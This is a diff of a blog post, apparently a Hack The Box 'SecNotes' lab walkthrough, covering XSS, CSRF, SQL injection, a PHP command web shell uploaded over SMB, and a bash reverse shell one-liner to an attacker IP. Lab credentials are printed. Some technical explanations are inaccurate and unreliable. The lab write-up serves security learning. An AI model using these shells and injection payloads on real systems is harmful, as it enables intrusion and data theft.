@@ -9,61 +9,77 @@ tags: [Secnotes]
 ![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*uMQqZEswmPNsTNV0HSvfeQ.jpeg)
 Another Retired Machine in the path of progressing for the OSCP.
 Reconnaissance:
-Analyzing Nmap result:
+** Analyzing Nmap result: ** 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*7-xk3boB3__EgXJ-XhEisw.png)
 
 
 we don’t really have that many ports to attack except 80 HTTP, 445 NetBIOS, and 8808 HTTP.
 
-Enumeration:
+**Enumeration: **
 Getting started with our 445 SMB, we don’t really have anything right now. Since an anonymous login is not allowed in this case. enum4linux or smbmap or smbclient. Has no use right now. There seems to be a website running on port 80 http. So, browsing to http://10.10.10.97 would let us redirected to the /login.html.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*g8lFPA7iSX8RMs8sc4HGfw.png)
 
 You can always try default credentials such as admin-password or user-password etc; And then wordlists or some SQL injections for fuzzing.
 
-Method #1 Cross-Site Request Forgery:
+**Method #1 Cross-Site Request Forgery:
 Sign up now button:
-
+**
 Since, There is a signup button we can register a user ourselves, and logging in can grant us a new empty user.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*D5CAfSgYo-NocTNKhZBwrA.png)
 
+![Untitled](https://miro.medium.com/v2/resize:fit:828/format:webp/1*uSh7-kTqBN-bTAG1YmmYsw.png)
 
 By understanding these options one by one in hand. can help us understand what type of vulnerabilities were present in the web server manually.
 
-Create New Note:
+**Create New Note:**
 
 In the view source(Ctrl+U) I’ve seen the Note textarea box has been enclosed by <textarea> HTML tag. So, I’m gonna close it with </textarea> and use our script command. If in this case it doesn’t we will go crafting it further improvising.
 
 For the POC (proof of concept) document.write(document.cookie) inside the <script> tag.
 
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*CJjyxFDFxNpMXzOynxv97g.png)
+
 Saving it redirects to the home page. And it’s working. we just discovered an XSS Vulnerability.
 
-Contact Us:
+![Untitled](https://miro.medium.com/v2/resize:fit:828/format:webp/1*gnskB5H2uS6536RD-GseUA.png)
 
+**Contact Us:**
+
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*le1FPoxkwUj1Kz2kfwobcg.png)
 
 There is a message box that seems to help us contact Tyler. So, Tyler seems to be an authenticated user. After sending it, it just redirects with a Pop up on the home screen “Message Sent”.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*-q7Ew1mg5OjS_gpG2xq-bA.png)
 
-Update Password:
+**Update Password:**
+
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*7S5oWULpGkAiUSobP8r8tQ.png)
 
 Interestingly, They weren’t asking for the old password while updating the new password. This might help us combine all other functionalities together to get access to Tyler’s user account.
 
 While listening on port 80 with nc -lvnp 80 on our attack machine and sending the message.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*iaZ1F7jqicSC_AUowxCsYw.png)
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*34IzD0zVEAq1KU_zAykDcQ.png)
 
 Gave us info, That there was a connection from port 51601 Windows Powershell from our victim machine. This means the Tyler user is automatically accessing the link.
 
-Exploitation:
+**Exploitation:**
 We this information in hand we can totally compromise the Tyler account😁. How?
 
 Let’s Dive in,
 
 While changing the password if intercept the request.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*By8Kc8kifosZFnuMXsqdbA.png)
 
 Right-click on the code and select the change request method.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:720/format:webp/1*LQynqdDE738QTLLg9ZMnqQ.png)
 
 Since Whatever link is being opened seems to be opened by Tyler. At this point. we could try injecting an HTML payload for a CMD shell.
 
@@ -74,33 +90,42 @@ http:10.10.14.17
 
 Now, let’s contact Tyler!!
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*J_JKHDcbxRsvC4BldoNiiQ.png)
 
 With that, the password would be changed!!!!
 
 Try logging, in with our new password and this should be working😁.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*moTRdxMzG6qycUZYca4kgw.png)
 
 If this wasn’t working,
 
+![Untitled](https://miro.medium.com/v2/resize:fit:720/format:webp/1*OMtI3QJwLsJGNNIb4M8XPw.gif)
 
-Method #2: Alternate way [SQL Injection]:
+**Method #2: Alternate way [SQL Injection]:**
 Since The server is been accessing the different notes with ID, So there should be a database running along with the web server.
 
 Since horizontal access is prevented from accessing the ID of the note. Let’s start enumeration with the register. If we can get some account. The fact that you can create a password for a valid user is possible. Makes this more possible. You can fire up the burp suite and do some brute-forcing with the following SQL Injection list. To find the one that’s working.
 
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*UkKAVhHtf3xWkThtfqvaLA.png)
+
 This should be working since Select * from users WHERE “Hello OR 1=1 —
 
 Always comes out to be TRUE.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*j843uD3Rhc8Iiw3nIi6iuw.png)
 
 Where “—” is for commenting out in HTML. This gonna work. Since The web server is vulnerable to SQL Injections.
 
 Logging in with our new credentials should let us access the Tyler User. Since it seemed to be the only other valid user.
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UJaL9Ec_0RBKdgca1WF66A.png)
 
 
+![Untitled](https://miro.medium.com/v2/resize:fit:458/format:webp/1*_cVkn1dDQ9G8vxRcoaQQZw.gif)
 
-Getting a Shell:
+
+**Getting a Shell:**
 
 Browsing through the notes we can spot there is a sub-directory and the other information looks like it is the username and password.
 
@@ -110,6 +135,7 @@ First, let’s verify that with the smbmap for detailed information on what’s 
 
 smbmap -H 10.10.10.97 -u tyler -p ‘92g!mA8BGjOirkL%OG*&’
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*7kNWAraizpQyKYKt-j26jQ.png)
 
 There is a share we can access here and have read and write permissions. Let’s dive in!!
 
@@ -117,25 +143,34 @@ smbclient \\\\10.10.10.97\\new-site -U tyler
 
 And Enter the password. That lets us to SMB Shell.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*dah9GlSZ1pInMHG_KUCtaw.png)
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*RuShR7o-030g8BmKUPSLlA.png)
 
 The files resemble the iisstart page we got on the port 8808.
 
 
-Possibly these web servers are accessing files from these shares.
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*k5Wh3709tqjXCRtI2_09dQ.png)
 
+Possibly these web servers are accessing files from these shares.
+ 
 I tried generating a .aspx payload with msfvenom, but it didn’t work out. So, the web server seems to accept only php files. Fortunately for us, PHP files can call system commands, so let us craft a PHP file and upload it.
 
+
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*-EOa-5N9B8I9fsKvzPoUNw.png)
 
 Fortunately for us, PHP files can call system commands, so let us craft a PHP file and upload it.
 
 
+![Php echo](https://miro.medium.com/v2/resize:fit:640/format:webp/1*XZFdT9lebtp1gd8db9DqqQ.png)
+
 <?php echo “Shell”;system($_GET[‘cmd’]); ?>
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/shell.php
+[Github Link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/shell.php)
 
 on SMB shell upload this payload using the put command. put shell.php
 
+![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*dg9g2vTbb8FmCKCuNOz0NQ.png)
 
 For getting a PowerShell we need a Netcat one-liner to be executed as a command. I’ll show you what I mean.
 
@@ -145,26 +180,32 @@ you can easily spot the nc.exe file in /usr/share/seclists/Web-Shells/FuzzDB if 
 
 Be sure to upload Netcat and the payload again(it gets deleted after some time since the server completely blocks it).
 
+![Netcat Listener](https://miro.medium.com/v2/resize:fit:640/format:webp/1*D3u95E29JfaWTwj0YgcG9w.png)
 
 Titidi dididi!! We got our Foothold with the powershell. with the same shell as smb but we have more control now🥳.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:786/format:webp/1*D7lODgpD3Oudgybl7OZVSA.png)
 
 Grab the user flag🤧.
 
+![Wounded Thinking](https://miro.medium.com/v2/resize:fit:640/format:webp/1*dB1Kp6HmPaKpSUuNpM4_pw.png)
 
+![Dinner Ready](https://miro.medium.com/v2/resize:fit:828/format:webp/1*g08G8kcIAiEXVSrbq2Et9w.gif)
 
 Getting a user flag is the hardest part for the Medium machine at Hackthebox.
 
 Now now, Let’s hunt the root flag…😋
 
+![Dinner Ready](https://miro.medium.com/v2/resize:fit:400/format:webp/1*dK8T1Lk88UcvQgPH5N6PIw.gif)
 
-Privilege Escalation:
+**Privilege Escalation:**
 Now, as we have some foothold for the machine.
 
 There is a file check-message.ps1 inside secnotes_contacts dir inside tyler’s directory.
 
 Which has Tyler’s default password: “forested85sunk” which automatically changes every 30 seconds with this script. use these credentials for login, If your tired of using the sql injection or csrf.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*3SKWohUfCZpVlPiijslneg.png)
 
 With Netcat, I couldn’t access or run some basic commands. So, I have decided to upgrade the command shell from Netcat to the Meterpreter shell.
 
@@ -172,44 +213,57 @@ In addition to this, I have uploaded a step-by-step tutorial to upgrade the Netc
 
 Let’s browse around to see… what we have right now.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:750/format:webp/1*01-0nsx8VUNnSFASaUu8bQ.png)
 
 There seems to be a bash link file. Which is a good sign, bash files are executed at kernel-level access. Meaning it has root privileges.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NxA0j_XFGLQGU22GJJ9EUQ.png)
 
 But, When I tried executing it. it is not recognized. Seems like the file has been moved from Windows\System32 to somewhere else.
 
 Let’s search for it.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*9Nx-k_Yw_JuU_zswK-vjhA.png)
+
 
 Change the directory to that folder, And let’s see if it’s working.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZCQQc9EHWGavVNQVpn0vVQ.png)
 
-Just as we thought, It does have the root privileges. So, For this to work, I have searched one-liner for reverse shells using bash || wanna Explore-More?.
+
+Just as we thought, It does have the root privileges. So, For this to work, I have searched one-liner for reverse shells using bash wanna Explore-More?.
 
 bash -i >& /dev/tcp/10.10.14.17/443 0>&1
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*z5xgGevy4dymyVCCJHs2Gg.png)
 
 Running this together and listening for this port through Netcat.
 
 bash.exe -c “bash -i >& /dev/tcp/10.10.14.17/443 0>&1”
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0hUyZD9_tYBt8y8pJA5LwQ.png)
 
 nc -lvnp 443 on our kali machine.
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*pTGoxgeBhoC59nMFumKnwQ.png)
 
 We got the Root Shell. Since the desktop runs a WSL we are accessing a Ubuntu machine. The shell is so floppy.
 
-
+![Untitled](https://miro.medium.com/v2/resize:fit:720/format:webp/1*FzE-mgeoZRWRRRWV9JqLOg.gif)
+![Untitled](https://miro.medium.com/v2/resize:fit:538/format:webp/1*5FX-eIboOQj_kRoTLNZFAQ.png)
 
 Normally listing it makes the files hidden. Since, They were created default by bash command as binaries.
 
 So, use ls -alps or ls -al
 
 
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*dTBsI22G2JrQ50YSM9f66A.png)
+
 We can see there is a bash_history file, Looks interesting.
 
 cat bash_history,
 
+![Untitled](https://miro.medium.com/v2/resize:fit:786/format:webp/1*pb2pcblAH974QK04-B2hig.png)
 
 And we have an Administrator and its password in the history🤩🤩!!
 
@@ -218,20 +272,29 @@ Let’s Verify it with smbmap,
 smbmap -u ’administrator’ -p ‘u6!4ZwgwOM#^OBf#Nwnh’ -H 10.10.10.97
 
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*n1jOLKELEDTk3tVTVS39cg.png)
+
+
 We have all the privileges C$ and ADMIN$ SMB Share too!!🤧
 
 
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*gBNlydYng8KAKZiH2jdPQA.png)
+
+![Untitled](https://miro.medium.com/v2/resize:fit:640/format:webp/1*UaLtJf-mFEZHyxQHs3YeIw.png)
 
 Root flag🥳🫡!!!
 
+![Untitled](https://miro.medium.com/v2/resize:fit:720/format:webp/1*6iHLm137BHVEkQLP-kXvKA.gif)
 
 Kanpai
+![Untitled](https://miro.medium.com/v2/resize:fit:828/format:webp/1*XMKlLG53vUrAieJP3kMsjw.png)
 
-In-Summary:
+**In-Summary:**
 
 SecNotes is a medium-difficulty machine that highlights the risks associated with weak password change mechanisms, lack of CSRF protection, and insufficient validation of user input. It also teaches about Windows Subsystem for Linux enumeration.
 
-Mind Map (Why we are doing, What we are doing?):
+**Mind Map (Why we are doing, What we are doing?):**
+![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*exy8kA9eZgVTVRYKu5pBlg.png)
 
 
 Made with xmind.
